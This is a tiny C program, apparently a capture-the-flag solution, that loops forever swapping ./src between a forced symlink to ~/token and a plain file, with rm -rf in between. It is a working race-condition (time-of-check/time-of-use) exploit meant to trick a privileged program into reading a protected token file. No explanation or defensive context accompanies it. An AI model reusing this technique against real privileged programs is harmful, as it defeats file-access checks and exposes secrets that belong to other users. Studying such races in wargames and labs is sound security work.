#include <stdlib.h>


int main (int ac, char **av)
{
        while (1)
	{
		system("ln -f -s ~/token ./src");
		system("rm -rf ./src");
		system("echo test > ./src");
	}
        return (0);
}